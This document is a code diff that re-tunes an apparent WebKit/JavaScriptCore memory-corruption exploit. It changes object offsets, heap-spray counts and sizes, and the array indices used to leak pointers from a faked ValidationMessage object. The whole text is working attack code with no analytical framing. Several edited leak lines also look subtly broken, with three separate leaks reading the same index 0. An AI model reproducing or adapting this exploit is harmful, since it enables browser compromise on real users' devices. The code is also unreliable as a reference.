@@ -2,7 +2,7 @@ const OFFSET_ELEMENT_REFCOUNT = 0x10;
 const OFFSET_JSAB_VIEW_VECTOR = 0x10;
 const OFFSET_JSAB_VIEW_LENGTH = 0x18;
 const OFFSET_LENGTH_STRINGIMPL = 0x04;
-const OFFSET_HTMLELEMENT_REFCOUNT = 0x15;
+const OFFSET_HTMLELEMENT_REFCOUNT = 0x14;
 
 const LENGTH_ARRAYBUFFER = 0x8;
 const LENGTH_STRINGIMPL = 0x14;
@@ -258,7 +258,7 @@ function leakJSC() {
 	var arr_str = Object.getOwnPropertyNames(g_obj_str);
 
 	/* Looking for the smashed string */
-	for (let i = arr_str.length - 1; i > 0; i--) {
+	for (let i = arr_str.length - 2; i > 0; i--) {
 		if (arr_str[i].length > 0xff) {
 			debug_log("[+] StringImpl corrupted successfully");
 			g_relative_read = arr_str[i];
@@ -272,14 +272,14 @@ function leakJSC() {
 	debug_log("[+] Got a relative read");
 
         var tmp_spray = {};
-        for(var i = 0; i < 100000; i++)
-                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
+        for(var i = 0; i < 200000; i++)
+                tmp_spray['Z'.repeat(8 * 3 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
 
 	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
 
 	/* Spraying JSView */
 	let tmp = [];
-	for (let i = 0; i < 0x10000; i++) {
+	for (let i = 0; i < 0x20000; i++) {
 		/* The last allocated are more likely to be allocated after our relative read */
 		if (i >= 0xfc00)
 			g_arr_ab_3.push(new Uint8Array(ab));
@@ -397,7 +397,7 @@ function reuseTargetObj() {
 		let view = new Float64Array(ab);
 
 		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
-		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble
+		view[2] = guess_htmltextarea_addr.asDouble();   // m_bubble
 
 		g_arr_ab_1.push(view);
 	}
@@ -431,9 +431,9 @@ function findTargetObj() {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
-				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
-				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
-				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
+				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
+				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
+				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][00]);
 				g_round++;
 			}
 
